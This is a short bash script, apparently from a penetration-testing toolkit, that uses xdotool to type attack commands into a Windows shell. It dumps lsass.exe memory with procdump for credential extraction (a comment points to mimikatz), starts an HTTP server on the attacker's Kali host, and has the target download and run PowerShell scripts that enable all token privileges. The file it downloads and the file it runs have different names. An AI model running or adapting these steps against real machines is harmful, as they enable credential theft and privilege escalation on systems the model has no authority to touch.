#!/bin/bash

: '
enable permission tokens
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

cd ~/Desktop/base/code/xdotool/scripts/windows/permissions/.files
python3 -m http.server 1337 &
HTTP_PID=$!

TMP_FOLDER="C:\temp"

# if these programs can't be uploaded to the target open task manager and search for lsass.exe
# right click and create dump file and download this to kali and use minikatz like discribed as above
paste_command "procdump.exe -accepteula -ma lsass.exe lsass.dmp"

paste_command 'New-Item -Path "c:\" -Name "temp" -ItemType "directory"'
xdotool key Return
sleep 0.8

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:1337/Enable-Privilege.ps1', '${TMP_FOLDER}\Enable-Privilege.ps1')"
xdotool key Return 
sleep 4

paste_command "${TMP_FOLDER}\EnableAllTokenPrivs.ps1"
xdotool key Return 
sleep 4

kill $HTTP_PID